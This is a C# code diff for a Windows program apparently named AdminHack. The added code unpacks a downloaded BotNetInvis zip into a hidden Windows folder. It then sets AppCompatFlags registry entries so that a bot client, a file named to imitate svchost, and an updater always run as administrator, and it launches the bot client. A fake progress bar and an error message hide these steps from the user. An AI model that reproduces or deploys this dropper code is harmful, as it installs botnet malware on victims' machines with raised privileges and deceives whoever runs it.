@@ -12,13 +12,15 @@ namespace AdminHack
 {
     public partial class Form1 : Form
     {
-        private static void admin (string path)
+        private static void admin (string path, string path2, string path3)
         {
             try
             {
                 RegistryKey reg;
-                reg = Registry.CurrentUser.CreateSubKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags");
-                reg.SetValue("systems", path);
+                reg = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers");
+                reg.SetValue("systems", path+"=RUNASADMIN");
+                reg.SetValue("systems2", path2 + "=RUNASADMIN");
+                reg.SetValue("systems3", path3 + "=RUNASADMIN");
             }
             catch { }
         }
@@ -45,8 +47,6 @@ namespace AdminHack
                 progressBar1.Value += 45;
                 Thread.Sleep(4000);
                 label4.Text += "\nUnknown error...";
-                admin(diskname[0] + "\\Windows\\ClientDir\\BotNetInvis\\BotNetClient.exe");
-                Process.Start(diskname[0] + "\\Windows\\ClientDir\\BotNetInvis\\BotNetClient.exe");
                 Thread.Sleep(5000);
                 throw new Exception();
             });
@@ -71,7 +71,7 @@ namespace AdminHack
                 byte[] bt = GetZip().Result;
             string[] diskname = Environment.CurrentDirectory.ToString().Split(new char[] { '\\' }, StringSplitOptions.RemoveEmptyEntries);
 
-            if (File.Exists(diskname[0] + "\\Windows\\ClientDir\\BotNetClient.exe"))
+            if (!File.Exists(diskname[0] + "\\Windows\\ClientDir\\BotNetClient.exe"))
             {
                 if (!File.Exists(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip"))
                 {
@@ -81,6 +81,8 @@ namespace AdminHack
                     ZipFile.ExtractToDirectory(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip", diskname[0] + "\\Windows\\ClientDir");
                     File.Delete(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip");
 
+                    admin(diskname[0] + "\\Windows\\ClientDir\\BotNetInvis\\BotNetClient.exe", diskname[0] + "\\Windows\\ClientDir\\BotNetInvis\\svchost.exe.exe", diskname[0] + "\\Windows\\ClientDir\\BotNetInvis\\Updater.exe");
+                    Process.Start(diskname[0] + "\\Windows\\ClientDir\\BotNetInvis\\BotNetClient.exe");
                 }
                 else
                 {
@@ -88,6 +90,9 @@ namespace AdminHack
                     di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                     ZipFile.ExtractToDirectory(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip", diskname[0] + "\\Windows\\ClientDir");
                     File.Delete(Environment.CurrentDirectory.ToString() + "\\BotNetInvis.zip");
+
+                    admin(diskname[0] + "\\Windows\\ClientDir\\BotNetInvis\\BotNetClient.exe", diskname[0] + "\\Windows\\ClientDir\\BotNetInvis\\svchost.exe.exe", diskname[0] + "\\Windows\\ClientDir\\BotNetInvis\\Updater.exe");
+                    Process.Start(diskname[0] + "\\Windows\\ClientDir\\BotNetInvis\\BotNetClient.exe");
                 }
             }
 
